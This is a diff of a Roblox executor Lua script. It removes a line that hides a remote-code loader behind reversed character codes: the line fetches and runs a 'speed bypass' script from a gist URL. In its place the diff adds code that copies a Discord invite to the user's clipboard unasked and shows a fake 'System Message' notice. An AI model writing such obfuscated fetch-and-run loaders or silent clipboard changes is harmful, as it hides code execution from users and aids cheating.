@@ -1,1 +1,20 @@
-loadstring((function(codes) local s = ''; for i = #codes, 1, -1 do s = s .. string.char(codes[i]) end return s end)({41,40,41,41,34,97,117,108,46,115,115,97,112,121,98,46,100,101,101,112,115,47,55,99,51,54,48,48,100,54,51,56,51,101,99,100,49,56,97,54,56,101,51,50,97,48,48,48,54,101,51,48,99,97,52,97,99,50,101,55,101,102,47,119,97,114,47,101,49,56,99,55,55,57,53,52,51,101,99,56,55,102,97,56,54,51,55,48,49,57,55,100,97,49,53,100,98,53,102,47,51,52,50,97,101,122,110,47,109,111,99,46,116,110,101,116,110,111,99,114,101,115,117,98,117,104,116,105,103,46,116,115,105,103,47,47,58,115,112,116,116,104,34,40,116,101,71,112,116,116,72,58,101,109,97,103,40,103,110,105,114,116,115,100,97,111,108}))()
+print("will start working soon")
+
+-- link , text
+local discordLink = "https://discord.gg/ckrPD2Xp72"
+local messageText = "temporarily out of service\n\nwatch the news .gg/ckrPD2Xp72\nthe link has been copied to the clipboard."
+
+if setclipboard then
+    setclipboard(discordLink)
+else
+    warn("setclipboard not working on your executor")
+end
+
+local StarterGui = game:GetService("StarterGui")
+
+StarterGui:SetCore("SendNotification", {
+    Title = "System Message",
+    Text = messageText,
+    Duration = 10,
+    Button1 = "OK"
+})
